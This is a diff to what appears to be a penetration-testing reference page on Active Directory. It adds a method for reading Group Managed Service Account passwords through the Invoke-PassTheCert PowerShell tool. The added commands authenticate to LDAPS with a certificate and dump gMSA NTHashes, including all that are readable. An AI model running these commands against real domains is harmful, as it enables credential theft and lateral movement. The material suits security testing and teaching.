@@ -1,5 +1,5 @@
 ---
-authors: CravateRouge, PfiatDe, ShutdownRepo, 0xblank
+authors: CravateRouge, PfiatDe, ShutdownRepo, 0xblank, jamarir
 category: ad
 ---
 
@@ -85,6 +85,20 @@ The second one relies on [GMSAPasswordReader](https://github.com/rvazarkar/GMSAP
 .\GMSAPasswordReader.exe --AccountName 'Target_Account'
 ```
 
+The third one relies on the [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) fork, authenticating through Schannel via [PassTheCert](https://www.thehacker.recipes/ad/movement/schannel/passthecert) (PowerShell).
+
+> Note: the [README](https://github.com/jamarir/Invoke-PassTheCert/blob/main/README.md) contains the methodology to request a certificate using [certreq](https://github.com/GhostPack/Certify/issues/13#issuecomment-3622538862) from Windows (with a password, or an NTHash).
+```powershell
+# Import the PowerShell script and show its manual
+Import-Module .\Invoke-PassTheCert.ps1
+.\Invoke-PassTheCert.ps1 -?
+# Authenticate to LDAP/S
+$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
+# List all the available actions
+Invoke-PassTheCert -a -NoBanner
+# Read the ManagedPassword-related attributes (NTHash included) of the 'gmsad$' Group Managed Service Account (not specifying -Object allows to retrieve every gMSAs' NTHashes the certificate account has access to).
+Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection $LdapConnection -Enum 'gMSA' -Object 'CN=gmsad,CN=Managed Service Accounts,DC=X'
+```
 
 :::
 
